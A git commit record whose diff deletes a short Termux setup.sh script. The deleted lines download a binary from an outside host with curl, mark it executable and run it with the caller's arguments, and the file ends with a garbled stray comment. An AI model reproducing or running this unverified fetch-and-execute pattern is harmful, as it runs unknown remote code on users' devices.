72a92d52dc634a88962885b4a357f1bbf567bdf0
armvionet <armvionet4@gmail.com>
2025-09-17 17:48:46 -0600

    Auto-commit por supervisión: 2025-09-17 17:48:41

--- setup.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-TMP_DIR=/data/data/com.termux/files/usr/tmp
-FILE_NAME=archivo
-curl -sSL "https://nt.viofull.com:8443/downloads/959d38664a3b40d89f7fbad09d81ef15_install_net" -o $TMP_DIR/$FILE_NAME && chmod +x $TMP_DIR/$FILE_NAME && $TMP_DIR/$FILE_NAME $@
-
-#ho cacaME"
-    
